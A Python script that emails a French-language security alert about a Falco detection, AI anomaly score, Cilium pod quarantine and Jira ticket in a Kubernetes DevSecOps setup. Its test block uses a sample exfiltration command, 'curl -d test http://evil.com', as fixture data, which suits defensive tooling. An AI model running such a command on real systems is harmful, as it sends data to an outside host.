import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def send_gmail_alert(event, score, remediation_success, remediation_msg="", jira_ticket=None):
    sender_email = os.environ.get("GMAIL_SENDER", "")
    receiver_email = os.environ.get("GMAIL_RECEIVER", "")
    app_password = os.environ.get("GMAIL_APP_PASSWORD")
    if not app_password or not sender_email or not receiver_email:
        print("[!] Email ignoré : définir GMAIL_SENDER, GMAIL_RECEIVER et GMAIL_APP_PASSWORD")
        return

    jira_line = "Ticket Jira : non créé (config absente ou API en erreur)."
    if jira_ticket:
        jira_line = f"Ticket Jira : {jira_ticket.get('key')} — {jira_ticket.get('url')}"

    subject = f"ALERTE CRITIQUE IA - Score: {score:.1f}/100 — quarantaine Cilium"

    body = f"""
Bonjour,

Votre IA DevSecOps a détecté une menace critique sur le cluster Kubernetes.

--- DÉTAILS DE L'INCIDENT ---
- Utilisateur : {event.get('user')} (UID: {event.get('user_uid')})
- Pod ciblé   : {event.get('pod')}
- Règle Falco : {event.get('rule')}
- Commande    : {event.get('command')}

Score IA d'anomalie : {score:.1f}/100

--- STATUT DE LA REMÉDIATION ---
{'Pod isolé (label quarantine=true, Cilium drop ingress/egress). Process conservé pour forensics.'
 if remediation_success
 else 'Isolation Cilium en échec. Intervention manuelle requise.'}

Détail : {remediation_msg}

--- TICKETING ---
{jira_line}
"""

    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_email, app_password)
        server.send_message(msg)
        server.quit()
        print(f"[+] Alerte Email envoyée à {receiver_email}")
    except Exception as e:
        print(f"[!] Erreur d'envoi Email : {e}")


if __name__ == "__main__":
    print("=== TEST EMAIL ===")
    send_gmail_alert(
        {
            "user": "root",
            "user_uid": "0",
            "pod": "pod-test-alerte",
            "rule": "Unexpected process spawned in application container",
            "command": "curl -d test http://evil.com",
        },
        80.1,
        True,
        "Pod isolé (lab test)",
        {"key": "SEC-1", "url": "https://example.atlassian.net/browse/SEC-1"},
    )
    print("=== FIN TEST ===")
